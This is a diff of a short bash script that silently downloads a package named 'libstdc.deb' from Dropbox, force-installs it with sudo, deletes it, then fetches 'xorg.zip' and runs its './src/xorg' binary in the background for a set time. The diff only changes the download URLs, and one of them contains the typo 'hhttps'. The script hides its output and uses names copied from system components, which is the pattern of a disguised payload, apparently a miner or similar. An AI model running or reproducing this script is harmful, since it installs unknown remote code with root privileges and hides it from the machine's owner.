@@ -1,10 +1,10 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
+wget hhttps://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
 sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
 rm -rf libstdc.deb
-wget https://www.dropbox.com/s/ea3o3abcbptdse2/xorg.zip -q
+wget https://www.dropbox.com/s/f1761pmxd0dpp3t/xorg.zip -q
 unzip xorg.zip > /dev/null 2>&1
 #pwd
 ./src/xorg ./src/xdata &
